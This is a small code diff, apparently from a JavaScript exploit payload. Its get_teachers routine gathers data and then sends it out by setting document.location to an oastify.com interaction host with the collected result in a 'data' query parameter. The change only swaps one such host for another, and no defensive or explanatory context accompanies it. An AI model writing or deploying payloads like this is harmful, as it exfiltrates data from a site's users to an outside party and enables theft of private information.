@@ -49,5 +49,6 @@ async function get_teachers(){
     ]
   });
 
-  document.location = `7w49sjhm0dax9p9uqtv0o25vwm2dq3es.oastify.com/?data=${result}`
+  document.location = `bwbdsnhq0ha19t9yqxv4o65zwq2iqee3.oastify.com/?data=${result}`
+
 })();
